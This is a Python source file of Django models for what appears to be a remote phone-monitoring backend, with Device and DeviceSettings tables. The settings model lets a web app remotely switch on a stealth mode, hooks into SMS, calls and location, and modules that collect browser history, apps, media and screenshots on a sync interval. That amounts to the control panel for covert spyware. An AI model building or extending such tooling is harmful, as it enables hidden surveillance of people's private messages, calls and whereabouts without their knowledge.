"""
Device Models
@author Michael KOJDL
@version 1.0.0
"""
from django.db import models
from django.conf import settings
import secrets
import string


class Device(models.Model):
    """Device Registration Model"""

    uuid = models.CharField(max_length=36, unique=True, db_index=True)
    api_key = models.CharField(max_length=64, unique=True)

    # Device Info
    manufacturer = models.CharField(max_length=100)
    model = models.CharField(max_length=100)
    serial = models.CharField(max_length=100, unique=True)
    os = models.CharField(max_length=50)
    os_version = models.CharField(max_length=50)
    imei = models.CharField(max_length=20, unique=True)

    # Ownership
    owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name='owned_devices'
    )
    shared_with = models.ManyToManyField(
        settings.AUTH_USER_MODEL,
        related_name='shared_devices',
        blank=True
    )

    # Status
    is_active = models.BooleanField(default=True)
    last_seen = models.DateTimeField(null=True, blank=True)

    # Metadata
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        db_table = 'devices'
        verbose_name = 'Device'
        verbose_name_plural = 'Devices'
        ordering = ['-created_at']

    def __str__(self):
        return f"{self.manufacturer} {self.model} ({self.uuid[:8]})"

    @staticmethod
    def generate_api_key():
        """Generate secure API key"""
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(20))


class DeviceSettings(models.Model):
    """
    Device Settings Model - Remote Configuration
    Allows WebApp to remotely control device settings
    """

    device = models.OneToOneField(
        Device,
        on_delete=models.CASCADE,
        related_name='settings',
        primary_key=True
    )

    # Server Configuration
    api_base_url = models.URLField(max_length=255, blank=True, null=True)
    wss_base_url = models.URLField(max_length=255, blank=True, null=True)

    # App Behavior
    stealth_mode_enabled = models.BooleanField(default=False)
    auto_start_enabled = models.BooleanField(default=True)

    # System Hooks
    sms_hook_enabled = models.BooleanField(default=True)
    call_hook_enabled = models.BooleanField(default=True)
    location_hook_enabled = models.BooleanField(default=True)

    # Module Enable/Disable
    module_sms_enabled = models.BooleanField(default=True)
    module_calls_enabled = models.BooleanField(default=True)
    module_location_enabled = models.BooleanField(default=True)
    module_apps_enabled = models.BooleanField(default=True)
    module_browser_enabled = models.BooleanField(default=True)
    module_media_enabled = models.BooleanField(default=True)
    module_screenshots_enabled = models.BooleanField(default=True)

    # Sync Settings
    sync_interval_minutes = models.IntegerField(default=5)  # Minutes between syncs

    # Metadata
    updated_at = models.DateTimeField(auto_now=True)
    settings_version = models.IntegerField(default=1)  # Increment on each update

    class Meta:
        db_table = 'device_settings'
        verbose_name = 'Device Settings'
        verbose_name_plural = 'Device Settings'

    def __str__(self):
        return f"Settings for {self.device}"
